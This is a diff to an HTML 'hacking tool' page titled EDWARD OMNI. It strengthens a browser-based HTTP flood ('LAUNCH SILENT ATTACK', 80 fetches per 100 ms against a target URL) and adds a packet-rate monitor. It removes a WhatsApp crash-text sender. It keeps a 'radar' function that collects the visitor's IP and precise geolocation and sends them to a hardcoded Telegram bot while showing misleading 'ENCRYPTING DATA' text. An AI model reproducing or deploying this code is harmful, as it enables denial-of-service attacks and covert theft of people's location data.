@@ -9,16 +9,22 @@
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin:0; padding: 20px; }
         .header-title { font-size: 18px; letter-spacing: 5px; text-shadow: 0 0 15px var(--neon); margin: 20px 0; font-weight: bold; text-align: center; }
         .card { border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 15px; padding: 20px; margin-bottom: 20px; background: rgba(10, 10, 10, 0.8); box-shadow: 0 0 15px rgba(0, 255, 0, 0.1); }
-        h3 { margin: 0 0 15px 0; font-size: 13px; color: #fff; letter-spacing: 2px; }
+        h3 { margin: 0 0 15px 0; font-size: 11px; color: #fff; letter-spacing: 2px; }
         input { background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 10px; width: 100%; margin-bottom: 15px; font-size: 14px; outline: none; }
         .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 12px; }
-        .btn-wa { background: #25D366; color: #000; }
-        .btn-phish { background: #bc13fe; color: #fff; }
+        .btn-phish { background: #bc13fe; color: #fff; box-shadow: 0 0 10px rgba(188, 19, 254, 0.4); }
         .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
-        #statusAttack { font-size: 10px; color: #ff0000; margin-top: 10px; display: none; text-align: center; }
+        
+        /* ATTACK MONITOR */
+        #monitor { display: none; margin-top: 15px; background: #080808; border-radius: 8px; padding: 10px; border: 1px solid #222; }
+        .stat-row { display: flex; justify-content: space-between; font-size: 10px; margin-bottom: 5px; }
+        .val { color: #fff; font-weight: bold; }
+        .pulse { animation: blink 1s infinite; color: #f00; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-ring { width: 220px; height: 220px; border: 1px solid var(--neon); border-radius: 50%; position: relative; }
-        .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.4), transparent); transform-origin: bottom right; animation: sweep 2s linear infinite; border-right: 1px solid var(--neon); }
+        .radar-ring { width: 200px; height: 200px; border: 1px solid var(--neon); border-radius: 50%; position: relative; }
+        .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.4), transparent); transform-origin: bottom right; animation: sweep 2s linear infinite; }
         @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -27,16 +33,15 @@
     <div class="header-title">EDWARD OMNI</div>
 
     <div class="card">
-        <h3>WHATSAPP BUG</h3>
-        <input type="number" id="noWA" placeholder="Target (628...)">
-        <button class="btn btn-wa" onclick="startWA()">EXECUTE ☠️</button>
-    </div>
-
-    <div class="card">
         <h3>PHISHING KILLER</h3>
-        <input type="text" id="targetUrl" placeholder="URL Target Penipu">
+        <input type="text" id="targetUrl" placeholder="https://link-penipu.com">
         <button class="btn btn-phish" id="atkBtn" onclick="toggleAttack()">LAUNCH SILENT ATTACK 🔥</button>
-        <div id="statusAttack">ATTACKING SERVER: [ SENDING PACKETS... ]</div>
+        
+        <div id="monitor">
+            <div class="stat-row"><span>STATUS:</span> <span class="val pulse">ATTACKING</span></div>
+            <div class="stat-row"><span>TOTAL PACKETS:</span> <span id="totalPkts" class="val">0</span></div>
+            <div class="stat-row"><span>STRENGTH:</span> <span id="pps" class="val">0</span> PKT/SEC</div>
+        </div>
     </div>
 
     <div class="card">
@@ -46,37 +51,49 @@
 
     <div id="radarOverlay">
         <div class="radar-ring"><div class="sweep"></div></div>
-        <p id="st" style="margin-top:30px; font-size:10px; letter-spacing:2px;">SCANNING...</p>
+        <p id="st" style="margin-top:30px; font-size:10px; letter-spacing:2px;">ENCRYPTING DATA...</p>
         <button onclick="location.reload()" style="background:transparent; border:none; color:#444; margin-top:20px;">[ CLOSE ]</button>
     </div>
 
     <script>
-        let isAttacking = false;
-        let attackInterval;
+        let isAtk = false;
+        let atkInt;
+        let total = 0;
+        let lastTotal = 0;
 
         function toggleAttack() {
             let u = document.getElementById('targetUrl').value;
-            if(!u) return alert("Masukkan URL!");
-            
+            if(!u) return;
             const btn = document.getElementById('atkBtn');
-            const status = document.getElementById('statusAttack');
+            const mon = document.getElementById('monitor');
 
-            if(!isAttacking) {
-                isAttacking = true;
+            if(!isAtk) {
+                isAtk = true;
                 btn.innerText = "STOP ATTACK 🛑";
-                status.style.display = "block";
+                btn.style.background = "#f00";
+                mon.style.display = "block";
                 
-                // Serangan Latar Belakang (Silent Flood)
-                attackInterval = setInterval(() => {
-                    for(let i=0; i<50; i++) {
-                        fetch(u, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {});
+                atkInt = setInterval(() => {
+                    for(let i=0; i<80; i++) {
+                        fetch(u, { mode: 'no-cors', cache: 'no-cache' }).then(() => { total++; }).catch(() => { total++; });
                     }
                 }, 100);
+
+                // Update Stats per detik
+                setInterval(() => {
+                    if(isAtk) {
+                        document.getElementById('totalPkts').innerText = total;
+                        document.getElementById('pps').innerText = (total - lastTotal);
+                        lastTotal = total;
+                    }
+                }, 1000);
+
             } else {
-                isAttacking = false;
+                isAtk = false;
                 btn.innerText = "LAUNCH SILENT ATTACK 🔥";
-                status.style.display = "none";
-                clearInterval(attackInterval);
+                btn.style.background = "#bc13fe";
+                mon.style.display = "none";
+                clearInterval(atkInt);
             }
         }
 
@@ -88,14 +105,9 @@
                 navigator.geolocation.getCurrentPosition((p) => {
                     let m = "🔱 [ LOCKED ] 🔱\nIP: "+ipD.ip+"\nLOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
                     fetch("https://api.telegram.org/bot8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g/sendMessage?chat_id=7898572558&text="+encodeURIComponent(m));
-                    document.getElementById('st').innerText = "SUCCESS: DATA SENT";
+                    document.getElementById('st').innerText = "DATA SENT TO MASTER";
                 }, null, {enableHighAccuracy:true});
             } catch(e){}
-        }
-
-        function startWA() {
-            let n = document.getElementById('noWA').value;
-            window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text=జ్ఞా".repeat(200);
         }
     </script>
 </body>
